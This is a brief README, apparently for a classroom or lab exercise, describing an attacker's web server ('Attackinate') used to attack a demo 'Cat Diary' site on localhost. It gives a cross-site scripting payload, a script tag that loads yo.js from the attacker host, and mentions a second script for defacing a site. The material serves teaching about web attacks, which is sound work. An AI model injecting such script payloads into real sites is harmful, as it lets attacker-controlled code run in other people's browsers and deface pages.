# Attackinate

This is the panther's web server, which he operates in order to attack the Cat Diary.

Run this on Windows (instead of in a docker container) to get a notification when
a trap is tripped.

Use cross-site scripting to set a trap.

Inject a call to this site's yo.js to trip the trap:

```
<script src="http://attackinate.localhost:8666/yo.js"></script>
```

You can also inject http://attackinate.localhost:8666/llamas.js to deface a site.


